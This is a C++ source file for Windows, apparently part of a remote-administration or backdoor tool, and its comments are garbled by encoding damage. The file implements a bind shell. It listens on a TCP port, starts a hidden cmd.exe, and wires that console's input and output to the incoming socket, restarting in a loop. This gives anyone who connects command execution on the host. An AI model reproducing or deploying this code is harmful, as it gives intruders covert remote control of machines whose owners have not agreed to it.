#include "stdafx.h"
#include "CmdServer.h"


HANDLE g_OnExit = NULL;




int sendCmd(int port) {
	WSADATA WSADa;    //����ṹ�������洢��WSAStartup�������ú󷵻ص�Windows Sockets���ݡ�����Ļ����ϲ��Ͳ����ͣ������������аٶ�
	sockaddr_in SockAddrIn;
	SOCKET CSocket, SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	WCHAR szCMDPath[255] = L"C:\\Windows\\System32\\cmd.exe";

	//�����ڴ棬��ʼ������
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));

	//��ȡcmd·��
	GetEnvironmentVariable(L"COMSPEG", szCMDPath, sizeof(szCMDPath));

	//����ws2_32.dll
	WSAStartup(0x0202, &WSADa);

	//���ñ�����Ϣ�Ͱ�Э��,����socket,��������:
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(port);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//���ð󶨶˿�
	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));

	//���÷������˼����˿�
	listen(CSocket, 1);
	iAddrSize = sizeof(SockAddrIn);

	//��ʼ����Զ�̷����������������ش��ڽṹ��
	SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize);

	StartupInfo.cb = sizeof(STARTUPINFO);

	StartupInfo.wShowWindow = SW_HIDE;

	StartupInfo.dwFlags = STARTF_USESTDHANDLES |

		STARTF_USESHOWWINDOW;

	StartupInfo.hStdInput = (HANDLE)SSocket;

	StartupInfo.hStdOutput = (HANDLE)SSocket;

	StartupInfo.hStdError = (HANDLE)SSocket;

	//���������ܵ���

	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	Sleep(5000);
	bool flag = (WaitForSingleObject(ProcessInfo.hProcess, INFINITE) == WAIT_OBJECT_0);
	cout << "waitforsingleobject" << flag << endl;

	CloseHandle(ProcessInfo.hProcess);

	CloseHandle(ProcessInfo.hThread);



	//�رս��̾����

	closesocket(CSocket);

	closesocket(SSocket);
	cout << "cmd�����˳�" << endl;
	WSACleanup();


	return 0;
}
DWORD WINAPI ThreadFun(LPVOID pM)
{
	while (1)
		if (sendCmd(*(int*)pM)) break;
	return 0;
}
CmdServer::CmdServer(int port)
{

	MasterPort = port;
}


CmdServer::~CmdServer()
{
}

int CmdServer::listenAtPort()
{
	

	HANDLE handle = CreateThread(NULL, 0, ThreadFun, &MasterPort, 0, NULL);
	if (handle) {
		if(WaitForSingleObject(g_OnExit, INFINITE) == WAIT_OBJECT_0)
			cout << "listenatport�����˳�:���ص���wait_object_o" << endl;
		else
			cout << "listenatport�����˳�:���ز�����wait_object_o" << endl;
	}
	return 0;
}
